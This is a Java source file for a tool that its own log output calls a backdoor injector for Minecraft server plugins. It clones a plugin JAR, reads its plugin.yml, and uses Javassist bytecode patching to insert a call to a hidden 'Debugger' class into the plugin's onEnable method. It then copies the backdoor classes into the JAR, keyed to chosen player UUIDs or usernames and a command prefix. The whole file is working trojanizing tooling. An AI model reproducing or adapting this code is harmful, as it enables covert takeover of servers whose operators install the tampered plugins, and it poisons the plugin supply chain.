package com.thiccindustries.debugger;

import javassist.*;
import org.apache.commons.lang.SystemUtils;
import org.yaml.snakeyaml.Yaml;

import javax.swing.*;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Map;

public class Injector {

    public static boolean patchFile(String orig, String out, SimpleConfig config) {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);

        if (!input.toFile().exists()) {
            InjectorGUI.displayError("Input file does not exist.");
            System.out.println("[Injector] Input file: " + input.getFileName() + " does not exist.");
            return false;
        }

        /*--- Create Output File ---*/

        File temp = new File("temp");
        temp.mkdirs();
        temp.deleteOnExit();

        //Clone file
        try {
            Files.copy(input, output);
        } catch (FileAlreadyExistsException e) {

            int override = JOptionPane.showConfirmDialog(null, "File: " + output.getFileName() + " already exists. Override?", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
            if (override == JOptionPane.YES_OPTION) {
                try {
                    Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e1) {
                    InjectorGUI.displayError("Unknown IO error when creating output file.");
                    System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
                    e.printStackTrace();
                    return false;
                }
            }else{
                return false;
            }

        } catch (IOException e) {
            InjectorGUI.displayError("Unknown IO Error when creating output file.");
            System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
            e.printStackTrace();
            return false;
        }

        /*--- Read Plugin Metadata ---*/

        System.out.println("[Injector] Reading plugin data for file: " + input.getFileName());
        System.out.println(input.toAbsolutePath());
        Map<String, Object> pluginYAML = readPluginYAML(input.toAbsolutePath().toString());
        String name = (String) pluginYAML.get("name");
        String mainClass = (String) pluginYAML.get("main");

        System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);

        /*--- Insert bytecode into main class ---*/

        try {
            ClassPool pool = new ClassPool(ClassPool.getDefault());
            pool.appendClassPath(orig);
            pool.appendClassPath(new ClassClassPath(com.thiccindustries.debugger.Debugger.class));

            //Get main class, and find onEnable method

            System.out.println("[Injector] Injecting backdoor loader into class.");

            CtClass cc = pool.get(mainClass);
            CtMethod m = cc.getDeclaredMethod("onEnable");

            //Parse UUID string
            StringBuilder sb = new StringBuilder();
            sb.append("new String[]{");
            for(int i = 0; i < config.UUID.length; i++){
                sb.append("\"");
                sb.append(config.UUID[i]);
                sb.append("\"");
                if(i != config.UUID.length - 1)
                    sb.append(",");
            }
            sb.append("}");
            System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");
            m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\"); }");

            //Write to temporary file
            cc.writeFile(temp.toString());
        }catch(Exception e){
            InjectorGUI.displayError("Unknown Javassist error.");
            System.out.println("[Injector] Unknown Javassist error.");
            e.printStackTrace();
            return false;
        }

        /*--- Write new main class ---*/

        System.out.println("[Injector] Writing patched main class.");

        Path patchedFile        = null;
        FileSystem outStream    = null;
        Path target             = null;
        try {
            //Write final patched file
            patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class");
            outStream   = FileSystems.newFileSystem(output, (ClassLoader) null);
            target      = outStream.getPath("/" + mainClass.replace(".", "/") + ".class");

            Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
        }catch(IOException e){
            InjectorGUI.displayError("Unknown IO error when copying new main class.");
            System.out.println("[Injector] Unknown IO error when copying new main class.");
            e.printStackTrace();
            return false;
        }

        /*--- Copy Backdoor Code ---*/

        System.out.println("[Injector] Injecting resources.");

        InputStream[] resourceStreams = {
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$1.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$2.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$3.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$4.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$5.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$6.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$7.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$8.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$9.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$10.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Debugger$11.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Config.class"),
                Injector.class.getResourceAsStream("/com/thiccindustries/debugger/Config$HelpItem.class")
        };


        Path[] targetPaths = {
                outStream.getPath("/com/thiccindustries/debugger/Debugger.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$1.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$2.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$3.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$4.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$5.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$6.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$7.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$8.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$9.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$10.class"),
                outStream.getPath("/com/thiccindustries/debugger/Debugger$11.class"),
                outStream.getPath("/com/thiccindustries/debugger/Config.class"),
                outStream.getPath("/com/thiccindustries/debugger/Config$HelpItem.class")
        };

        try {
            //Create thiccindustries directory structure
            Files.createDirectories(outStream.getPath("/com/thiccindustries/debugger"));

            //copy files

            for (int i = 0; i < targetPaths.length; i++) {
                System.out.println("    (" + (i + 1) + "/" + targetPaths.length + ") " + targetPaths[i].getFileName());
                Files.copy(resourceStreams[i], targetPaths[i]);
            }

            System.out.println("[Injector] Finished writing file: " + output.getFileName());
            outStream.close();

        }catch(FileAlreadyExistsException e){
            InjectorGUI.displayError("Resource file exists, is the plugin already patched?");
            System.out.println("[Injector] Plugin already patched.");
            e.printStackTrace();
            return false;
        }
        catch(IOException e){
            InjectorGUI.displayError("Unknown IO error while copying resources.");
            System.out.println("[Injector] Unknown IO error while copying resources.");
            e.printStackTrace();
            return false;
        }

        return true;
    }

    private static Map<String, Object> readPluginYAML(String path) {
        Yaml yamlData = new Yaml();
        InputStream is = null;

        //Get plugin.yml file path
        String inputFile = null;
        if(SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC)
            inputFile = "jar:file://" + path + "!/plugin.yml";
        if(SystemUtils.IS_OS_WINDOWS)
            inputFile = "jar:file:/" + path + "!/plugin.yml";

        try {
            if (inputFile.startsWith("jar:")) {
                URL inputURL = new URL(inputFile);
                JarURLConnection connection = (JarURLConnection) inputURL.openConnection();
                is = connection.getInputStream();
            }
        } catch (IOException e) {
            InjectorGUI.displayError("Error while reading plugin metadata.");
            System.out.println("[Injector] Unknown error whilst parsing plugin YAML.");
            e.printStackTrace();
            return null;
        }

        return yamlData.load(is);
    }

    //Simplifed config for injector gui
    public static class SimpleConfig {
        public boolean useUsernames;
        public String[] UUID;
        public String prefix;

        public SimpleConfig(boolean b, String[] s1, String s2) {
            useUsernames = b;
            UUID = s1;
            prefix = s2;
        }
    }

}


